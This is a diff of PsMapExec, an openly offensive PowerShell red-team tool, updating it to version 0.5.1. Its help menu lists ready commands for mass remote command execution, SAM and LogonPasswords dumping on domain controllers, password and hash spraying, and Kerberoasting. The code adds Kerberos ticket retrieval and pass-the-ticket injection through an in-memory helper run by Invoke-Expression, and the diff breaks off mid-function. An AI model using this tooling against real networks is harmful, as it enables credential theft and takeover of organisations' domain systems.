@@ -1,96 +1,225 @@
 Function PsMapExec {
 
-    [CmdletBinding()]
+    [CmdletBinding(DefaultParameterSetName = 'Default')]
     Param(
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Command = '',
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Command,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Targets = '',
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Targets,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$Domain = "$env:USERDNSDOMAIN",
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Username = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Username,
 
-        [Parameter(Mandatory = $True, ValueFromPipeline = $true)]
-        [String]$Method = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Method,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Module = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Module,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Hash = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Hash,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Password = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Password,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$UserDomain = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$UserDomain,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$LocalFileServer = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$LocalFileServer,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [int]$Threads = 30,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$Force,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$LocalAuth,
     
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$CurrentUser = $True,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$SuccessOnly,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$ShowOutput,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$Ticket = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Ticket,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [Switch]$AccountAsPassword,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [Switch]$EmptyPassword,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [int]$Port = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [int]$Port,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [Switch]$NoParse,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$SprayHash = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$SprayHash,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [String]$SprayPassword = "",
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$SprayPassword,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$NoBanner,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [string]$DomainController,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [int]$Timeout = 3000,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$Flush,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [switch]$Scramble,
 
-        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
-        [switch]$Rainbow
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [switch]$Rainbow,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [Switch]$Help,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Option
     )
 
+    if ($Help) {
 
+        $HelpOutput = @("
+
+-----------------------------------------------------------------------------------------------------------
+---------------------------------------------- [ Help Menu ] ---------------------------------------------- 
+
+Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
+
+-----------------------------------------------------------------------------------------------------------
+ Examples
+
+ # Execute WMI commands over all systems in the domain using password authentication
+   PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""
+
+ # Execute WinRM commands over all systems in the domain using hash authentication
+   PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""
+
+ # Check RDP Access against workstations in the domain and using local authentication
+   PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
+
+ # Dump SAM on a single system using SMB and a -ticket for authentication
+   PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM
+
+ # Check SMB Signing on all domain systems
+   PsMapExec -Targets All -Method GenRelayList
+
+ # Dump LogonPasswords on all Domain Controllers over WinRM
+   PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords
+
+ # Use WMI to check current user admin access from systems read from a text file
+   PsMapExec -Targets C:\temp\Systems.txt -Method WMI
+
+ # Spray passwords across all accounts in the domain
+   PsMapExec -Method Spray -SprayPassword [Password]
+
+ # Spray Hashes across all accounts in the domain
+   PsMapExec -Method Spray -SprayHash [Hash]
+
+ # Spray Hashes across all Domain Admin group users
+   PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]
+
+ # Kerberoast 
+   PsMapExec -Method Kerberoast -ShowOutput
+
+ # IPMI
+   PsMapExec -Targets 192.168.1.0/24 IPMI
+
+-----------------------------------------------------------------------------------------------------------
+
+ 
+ 
+ General Usage Parameters
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | Parameter           |    Value     | Description                                                     |
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | -Command            |    whoami    | Executes a command on the target system                         |
+ | -CurrentUser        |     N/A      | Defaults to current user context without other credentials      |
+ | -Domain             |    Domain    | Sets the domain for the operation, defaults to user's domain    |
+ | -DomainController   |      DC      | Identifies which Domain controller to authenticate against      |
+ | -Force              |     N/A      | Forces execution with domain admin credentials                  |
+ | -Flush              |     N/A      | Clears LDAP variables for long-term, large environments         |
+ | -LocalFileServer    |      IP      | Retrieves scripts from a specified local file server IP         |
+ | -Module             |    Module    | Specifies the module for command execution                      |
+ | -NoBanner           |     N/A      | Hides the script banner                                         |
+ | -NoParse            |     N/A      | Avoids parsing some module outputs                              |
+ | -Rainbow            |     N/A      | Uses online rainbow tables for specific module hash analysis    |
+ | -SuccessOnly        |     N/A      | Shows only successful results                                   |
+ | -Timeout            |     int      | Sets the port scan timeout in milliseconds                      |
+ | -Threads            |     int      | Determines thread count, default is 30                          |
+ +---------------------+--------------+-----------------------------------------------------------------+
+
+ Authentication Parameters
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | Parameter           |    Value     | Description                                                     |
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | -Hash               | RC4 or AES   | Hash value. Must be supplied with -Username                     |
+ | -LocalAuth          |     N/A      | Specifies local account authentication                          |
+ | -Password           |   Password   | Password value. Must be supplied with -Username                 |
+ | -Ticket             |    Ticket    | B64 encoded Kerberos ticket for authentication.                 |
+ +---------------------+--------------+-----------------------------------------------------------------+
+
+ Command execution Parameters
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | Parameter           |    Value     | Description                                                     |
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | -Command            |   Command    | Runs the specified command on the remote system                 |
+ | -Module             |   Module     | Specifies the module for command execution                      |
+ | -ShowOutput         |     N/A      | Displays output for executed modules. Commands shown by default |
+ +---------------------+--------------+-----------------------------------------------------------------+
+
+ Spraying Parameters
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | Parameter           |    Value     | Description                                                     |
+ +---------------------+--------------+-----------------------------------------------------------------+
+ | -AccountAsPassword  |      N/A     | Sprays SAM Account names as passwords                           |
+ | -EmptyPassword      |      N/A     | Sprays blank passwords                                          |
+ | -SprayHash          | RC4/AES/NTLM | defines the hash value for spraying                             |
+ | -SprayPassword      |   Password   | defines the password value for spraying                         |
+ +---------------------+--------------+-----------------------------------------------------------------+
+
+ ---------------------------------------------- [ End Menu ] ----------------------------------------------- 
+ -----------------------------------------------------------------------------------------------------------
+
+")
+
+        $HelpOutput | Write-Output
+        return
+
+    }
+
+    if (!$Method) {
+    
+        Write-Host
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "You must provide a value for -Method"
+    
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Run ""PsMapExec -help"" for command line usage"
+        Write-Host
+    
+        return
+    
+    }
 
     $startTime = Get-Date
     Set-Variable MaximumHistoryCount 32767
@@ -99,7 +228,6 @@ Function PsMapExec {
     if ($Method -eq "Spray" -and $Targets -eq "") {
         $Targets = "all"
     }
-
 
     ################################################################################################################
     ###################################### Banner and version information ##########################################
@@ -115,7 +243,7 @@ Function PsMapExec {
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.4.7")
+Version : 0.5.1")
 
     if (!$NoBanner) {
         Write-Output $Banner
@@ -132,6 +260,27 @@ Version : 0.4.7")
 
     $DomainJoined = Test-DomainJoinStatus
 
+    $Klist = -not (& klist | Select-String -Pattern "Cached Tickets: \(0\)")
+    if (!$klist) { Write-verbose "No Kerberos tickets in cache" }
+
+    Function Inform-Inject {
+
+        if (!$Klist -and $Method -ne "Inject") {
+            Write-Host
+            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "For non-domain systems, use -Method ""Inject"" for PsMapExec to function correctly."
+            Write-Host
+            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "PsMapExec -Domain Security.local -Method Inject -Username User -Password Pass"
+            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "PsMapExec -Domain Security.local -Method Inject -Username User -Hash Hash"
+            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "PsMapExec -Domain Security.local -Method Inject -Ticket [Base64 ticket / Path to ticket]"
+            break
+        }
+        return
+    }
+
     if ($DomainJoined) {
         if ($NoBanner) { Write-Output "" }
         Write-Output "Domain  : Yes"
@@ -139,9 +288,12 @@ Version : 0.4.7")
     elseif (!$DomainJoined) {
         if ($NoBanner) { Write-Output "" }
         Write-Output "Domain  : No"
+        Inform-Inject
+        if ($Global:SkipRestoreTicket -eq $null) { $Global:SkipRestoreTicket = $false }
     }
 
-    if ($Flush) {
+    function Flush {
+        Write-Verbose "[Flush] LDAP flushed"
         $global:DomainAdmins = $null
         $global:EnterpriseAdmins = $null
         $global:ServerOperators = $null
@@ -159,12 +311,61 @@ Version : 0.4.7")
 
     }
 
+    Function LastDomain {
+
+        <#
+.SYNOPSIS
+Tracks domain name changes and flushes stored LDAP queries when a new domain is detected.
+
+.DESCRIPTION
+The LastDomain function is designed to manage and track the domain name currently being processed. 
+It ensures that LDAP query results stored in memory are relevant to the current domain. 
+If a change in the domain name is detected compared to the last run, the function triggers a flush operation. 
+This flush operation clears the stored LDAP queries to prevent the reuse of results from a different domain.
+#>
+        param ($Domain)
+    
+        if ($null -eq $Global:LastDomain) {
+            $Global:LastDomain = $null
+            Write-Verbose "Initialized $Global:LastDomain to null since it was not previously set"
+        }
+
+        if ($Global:LastDomain -ne $Domain) {
+            if ($Global:LastDomain -ne $null) {
+                Write-Verbose "[LastDomain] Domain change detected. Previous domain: '$Global:LastDomain', New domain: $Domain"
+                Flush
+            }
+            else {
+                Write-Verbose "This is the first run or $Global:LastDomain was previously null. Setting domain to $Domain"
+            }
+            $Global:LastDomain = $Domain
+        }
+        else {
+            if ($Global:LastDomain -eq $null) {
+                Write-Verbose "[LastDomain] No previous domain set. Initializing $Global:LastDomain with $Domain"
+                $Global:LastDomain = $Domain
+            }
+            else {
+                Write-Verbose "[LastDomain] No domain change detected. Continuing with cached LDAP queries"
+            }
+        }
+    }
+
+    LastDomain -Domain $Domain
+
+    <# 
+    Ideally, when UserDomain is populated we can could track queried LDAP objects.
+    The easier option for the moment is to flush when populated so we do not pollute
+    the ldap queries with objects from a different domain
+    #>
+    if ($Flush -or $UserDomain -ne "") { Flush }
+
     # If no targets have been provided
-    if (-not $Targets -and $Method -ne "Spray") {
+    if (-not $Targets -and $Method -ne "Spray" -and $Method -ne "Kerberoast" -and $Method -ne "Inject") {
     
         Write-Host
         Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
-        Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
+        Write-host "You must provide a value for -targets (all, servers, DCs, Workstations or an individual system FQDN)"
         return
     }
 
@@ -181,27 +382,7 @@ Version : 0.4.7")
     elseif ($Targets -eq "Servers") { Write-Host "Targets : Servers" }
     elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") { Write-Host "Targets : Domain Controllers" }
     elseif ($Targets -eq "All" -or $Targets -eq "Everything") { Write-Host "Targets : All" }
-    elseif ($Targets -notmatch "\*") { $IsFile = Test-Path $Targets ; if ($IsFile) { Write-Host "Targets : File ($Targets)" } }
-
-    function IsIPAddressOrCIDR {
-        param ([string]$Target)
-
-        # Regular expressions for IP address and CIDR notation
-        $ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
-        $cidrPattern = '^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$'
-
-        # Check if the target matches either the IP address or CIDR pattern
-        return $Target -match $ipPattern -or $Target -match $cidrPattern
-    }
-
-
-    # Check if Targets is a valid IP or CIDR
-    if (IsIPAddressOrCIDR $Targets) {
-        Write-Host
-        Write-Error "IP Address not yet supported"
-        continue
-    }
-    else { $IPAddress = $False }
+    elseif ($Targets -notmatch "\*" -and $Method -ne "Spray" -and $Method -ne "Kerberoast" -and "$Method" -ne "Inject") { $IsFile = Test-Path $Targets ; if ($IsFile) { Write-Host "Targets : File ($Targets)" } }
 
     ################################################################################################################
     ####################################### Some logic based checking ##############################################
@@ -218,6 +399,9 @@ Version : 0.4.7")
             "SessionHunter" {}
             "Spray" {}
             "VNC" {}
+            "Kerberoast" {}
+            "Inject" {}
+            "IPMI" {}
 
             default {
             
@@ -225,7 +409,7 @@ Version : 0.4.7")
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                 Write-Host "Invalid Method specified"
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-                Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+                Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, Kerberoast, Inject or IPMI"
                 return
             }
         }
@@ -267,7 +451,6 @@ Version : 0.4.7")
         return
     }
 
-
     if ($Threads -lt 1 -or -not [int]::TryParse($Threads, [ref]0)) {
         
         Write-Host
@@ -283,8 +466,6 @@ Version : 0.4.7")
         Write-Host "Threads value should not be than 100. This will likely cause results to be missed."
         return
     }
-
-
 
     if (!$DomainJoined) { $CurrentUser = $False }
 
@@ -302,8 +483,6 @@ Version : 0.4.7")
     if ($Method -eq "RDP") { $CurrentUser = $True }
     if ($Method -eq "MSSQL") { $CurrentUser = $True }
 
-
-
     if ($Method -eq "" -and !$SessionHunter -and !$Spray) {
         
         Write-Host
@@ -311,7 +490,6 @@ Version : 0.4.7")
         Write-Host "No method specified"
         return
     }
-
 
     if ($Method -eq "RDP") {
         if ($Hash -ne "") {
@@ -338,7 +516,6 @@ Version : 0.4.7")
             return
         }
     }
-
 
     if ($Method -eq "VNC") {
         if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
@@ -415,6 +592,15 @@ Version : 0.4.7")
         Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
     }
 
+    if ($Method -eq "ALL" -and ($Module -ne "" -or $Command -ne "")) {
+
+        Write-Host
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Method ""All"" does not support command or module execution currently"
+        return
+
+    }
+
     if ($Method -eq "MSSQL" -and $LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
     
         Write-Host
@@ -446,6 +632,23 @@ Version : 0.4.7")
         }
     }
 
+    if ($Method -eq "Kerberoast" -and $Module -ne "") {
+            
+        Write-Host
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Incorrect parameters for -Method Kerberoast"
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Example:  PsMapExec -Method Kerberoast"
+        return
+
+        if ($Domain -ne $env:USERDNSDOMAIN) {
+                
+            Write-Host
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Only the current user domain is support for Kerberoasting"
+            return
+        }
+    }
 
     # Check if this conflicts with anything
     if ($LocalAuth) { $CurrentUser = $True }
@@ -481,9 +684,6 @@ Version : 0.4.7")
         }
     }
 
-
-
-
     ################################################################################################################
     ########################################### Current User Ticket ################################################
     ################################################################################################################
@@ -491,54 +691,64 @@ Version : 0.4.7")
     # Check if the current user is an administrator, used for ticket functions
     $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-    $Klist = -not (& klist | Select-String -Pattern "Cached Tickets: \(0\)")
-    if (!$klist) { Write-verbose "No Kerberos tickets in cache" }  
-
     function GetCurrentUserTicket {
-
-        Invoke-Expression -Command $Global:rbs
+        $Local:ErrorActionPreference = "SilentlyContinue"
     
+        Invoke-Expression -Command $Global:rbs
+
         if ($Method -ne "RDP") {
             if ($Method -ne "MSSQL") {
-                if ($DomainJoined) {
+                if (!$Global:SkipRestoreTicket) {
                     if ($Klist) {
                         try {
                             Write-Verbose "Attempting to obtain current user ticket"
                             if ($DomainController -ne "") {
-                                $BaseTicket = Invoke-rTickets send /domain:$domain /dc:$DomainController /nowrap| Out-String
+                                $BaseTicket = Invoke-rTickets send /domain:$domain /dc:$DomainController /nowrap | Out-String
+                                Write-Verbose "[GUCT] (1) "
                             }
                             else {
-                                $BaseTicket = Invoke-rTickets send /nowrap /domain:$domain | Out-string
+                                $BaseTicket = Invoke-rTickets send /nowrap /domain:$domain | Out-String
+                                Write-Verbose "[GUCT] (2) "
                             }
-                            $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-                        }
-                        catch {
+
+                            # Inner try block to handle specific conditions
                             try {
-                                if (!$CheckAdmin) {
-                                    $BaseTicket = Invoke-rTickets get /service:krbtgt /nowrap | Out-String
-                                    $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-
-                                    if ($Global:OriginalUserTicket -notlike "doI*") {
-                                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
-                                        Write-Host "Unable to retrieve any Kerberos tickets"
-                                        break
-                                    }
-                                }
-                                elseif ($CheckAdmin) {
-                                    $BaseTicket = Invoke-rTickets get /service:krbtgt /username:$env:username /nowrap | Out-String
-                                    $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-
-                                    if ($Global:OriginalUserTicket -notlike "doI*") {
-                                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
-                                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
-                                        break
-                                    }
+                                if ($BaseTicket -like "*No target SPN specified*") {
+                                    Write-verbose "[GUCT] Error, trying a different method"
+                                    throw
                                 }
                             }
                             catch {
-                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                                Write-Host "Unable to retrieve any Kerberos tickets"
-                                break
+                                # Re-throw the exception to be caught by the outer catch
+                                throw
+                            }
+
+                            $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                            Write-Verbose "[GUCT] (3) "
+                        }
+                        catch {
+                            # This is the first (outer) catch block where the exception is ultimately handled
+                            if (!$CheckAdmin) {
+                                $BaseTicket = Invoke-rTickets get /service:krbtgt /nowrap | Out-String
+                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                                Write-Verbose "[GUCT] (4) "
+
+                                if ($Global:OriginalUserTicket -notlike "doI*") {
+                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                                    Write-Host "Unable to retrieve any Kerberos tickets"
+                                    break
+                                }
+                            }
+                            elseif ($CheckAdmin) {
+                                $BaseTicket = Invoke-rTickets get /service:krbtgt /username:$env:username /nowrap | Out-String
+                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                                Write-Verbose "[GUCT] (5) "
+
+                                if ($Global:OriginalUserTicket -notlike "doI*") {
+                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                                    Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                                    break
+                                }
                             }
                         }
                     }
@@ -550,34 +760,34 @@ Version : 0.4.7")
     ################################################################################################################
     ################################################# Function: RestoreTicket ######################################
     ################################################################################################################
-    Function RestoreTicket {
-        if (!$CurrentUser) {
-            if ($Klist -eq $False) {
-                Write-Verbose "Clearing tickets as no tickets in original cache"
-                klist purge | Out-Null
-                return
+
+    function RestoreTicket {
+
+        # Skip function execution if credentials are invalid or the global skip condition is set.
+        if (-not $InvalidCredentials) {
+            if ($Method -eq "Inject") {
+                $Global:SkipRestoreTicket = $true
             }
 
-            if ($Method -ne "GenRelayList") {
-                Write-Verbose "Restoring Ticket"
-                klist purge | Out-Null
-                Start-sleep -Milliseconds 100
+            if ($Global:SkipRestoreTicket) {
+                Write-Verbose "[Function: RestoreTicket] Skipping RestoreTicket function as per global condition."
+                $Global:SkipRestoreTicket = $false  # Reset the global variable immediately after use
+                return
+            }
+        }
 
-                klist purge | Out-Null
-
-                if ($DomainController -ne "") { Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /dc:$DomainController | Out-Null }
-                else { Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null }
-                
-
-                try {
-                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction "SilentlyContinue"
-                    $DomainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
-                    $PDC = $domainContext.PdcRoleOwner.Name
-                    Write-Verbose "Creating LDAP TGS for $PDC"
-                }
-                catch {
-                    Write-Verbose "Error creating ticket to $PDC"
-                }
+        # Execute the main logic only if there's no current user context
+        if (-not $CurrentUser) {
+            Write-Verbose ""
+            Write-Verbose "[Function: RestoreTicket] Restoring Ticket"
+            klist purge | Out-Null  # Purge tickets for both conditions
+            Start-Sleep -Milliseconds 100
+        
+            if ($DomainController) {
+                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /dc:$DomainController | Out-Null
+            }
+            else {
+                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null
             }
         }
     }
@@ -674,6 +884,7 @@ Version : 0.4.7")
                 if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Incorrect password or username"
+                    $InvalidCredentials = $true
                     klist purge | Out-Null
                     RestoreTicket
                 
@@ -683,6 +894,7 @@ Version : 0.4.7")
                 if ($AskPassword -like "*Unhandled rTickets exception:*") {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Incorrect password or username"
+                    $InvalidCredentials = $true
                     klist purge | Out-Null
                     RestoreTicket
                 
@@ -729,6 +941,7 @@ Version : 0.4.7")
                     if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
+                        $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
                     
@@ -738,6 +951,7 @@ Version : 0.4.7")
                     if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
+                        $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
                         
@@ -781,6 +995,7 @@ Version : 0.4.7")
                     if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
+                        $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
                     
@@ -790,6 +1005,7 @@ Version : 0.4.7")
                     if ($Ask256 -like "*Unhandled rTickets exception:*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
+                        $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
                     
@@ -845,6 +1061,7 @@ Version : 0.4.7")
                     if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
+                        $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
                     
@@ -854,6 +1071,7 @@ Version : 0.4.7")
                     if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
+                        $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
                         
@@ -882,8 +1100,15 @@ Version : 0.4.7")
 
             }
         }
-    }
 
+        if ($Method -eq "Inject") {
+            Write-Verbose "[Function: ProcessTicket] Injecting Ticket"
+            RestoreTicket
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-host "Ticket Successfuly Injected"
+            break
+        }
+    }
 
     ################################################################################################################
     ############################################## Load Amnesiac ###################################################
@@ -933,11 +1158,36 @@ Version : 0.4.7")
         }
     }
 
-
     ################################################################################################################
     ######################################### Console Display variables ############################################
     ################################################################################################################
 
+    function Resolve-DnsNameWithTimeout {
+        param(
+            [string]$IPAddress,
+            [int]$Timeout
+        )
+        if ($Method -eq "IPMI") { Write-Host ("{0}" -f "") -NoNewline ; return }
+        try {
+            $timeoutTask = [timespan]::FromMilliseconds($Timeout)
+            $task = [System.Net.Dns]::GetHostEntryAsync($IPAddress)
+
+            $sw = [System.Diagnostics.Stopwatch]::StartNew()
+
+            if ($task.Wait($timeoutTask)) {
+                $sw.Stop() # Stop the stopwatch
+                Write-Host ("{0,-44}" -f $($task.Result.HostName)) -NoNewline
+            }
+            else {
+                $sw.Stop()
+                Write-Host ("{0,-44}" -f "") -NoNewline
+            }
+        }
+        catch {
+            Write-Host ("{0,-44}" -f "") -NoNewline
+        } 
+    }
+    
     function Display-ComputerStatus {
         param (
             [string]$ComputerName,
@@ -959,26 +1209,37 @@ Version : 0.4.7")
             "GenRelayList" { Write-Host "GenRelayList" -ForegroundColor "Yellow" -NoNewline }
             "SessionHunter" { Write-Host "SessionHunter" -ForegroundColor "Yellow" -NoNewline }
             "VNC" { Write-Host "VNC" -ForegroundColor "Yellow" -NoNewline }
+            "IPMI" { Write-Host "IPMI" -ForegroundColor "Yellow" -NoNewline }
         }
     
         Write-Host "   " -NoNewline
 
-        # Resolve IP
-        $IP = $null
-        $Ping = New-Object System.Net.NetworkInformation.Ping
-        $Result = $Ping.Send($ComputerName, 15)
-        if ($Result.Status -eq 'Success') {
-            $IP = $Result.Address.IPAddressToString
-            Write-Host ("{0,-16}" -f $IP) -NoNewline
+        if (!$IPAddress) {
+            # Resolve IP
+            $IP = $null
+            $Ping = New-Object System.Net.NetworkInformation.Ping
+            $Result = $Ping.Send($ComputerName, 15)
+            if ($Result.Status -eq 'Success') {
+                $IP = $Result.Address.IPAddressToString
+                Write-Host ("{0,-16}" -f $IP) -NoNewline
+            }
+            else {
+                Write-Host ("{0,-16}" -f $IP) -NoNewline
+            }
         }
-        else {
-            Write-Host ("{0,-16}" -f $IP) -NoNewline
+        elseif ($IPAddress) {
+
